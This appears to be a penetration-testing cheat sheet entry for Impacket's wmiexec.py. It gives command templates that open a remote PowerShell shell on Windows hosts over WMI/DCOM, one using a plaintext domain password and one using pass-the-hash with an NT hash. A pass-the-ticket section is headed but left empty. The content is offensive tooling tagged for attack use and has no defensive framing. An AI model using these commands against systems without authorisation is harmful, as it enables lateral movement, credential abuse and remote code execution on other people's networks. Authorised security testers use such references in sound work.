# wmiexec (imp)

% windows, impacket-exec

## wmiexec (creds)
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py -shell-type powershell '<domain>/<user>:<password>'@<ip>
```

## pth (pth) 
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py -shell-type powershell -hashes <nt_hash> <user>@<ip>
```

## wmiexec (ptt)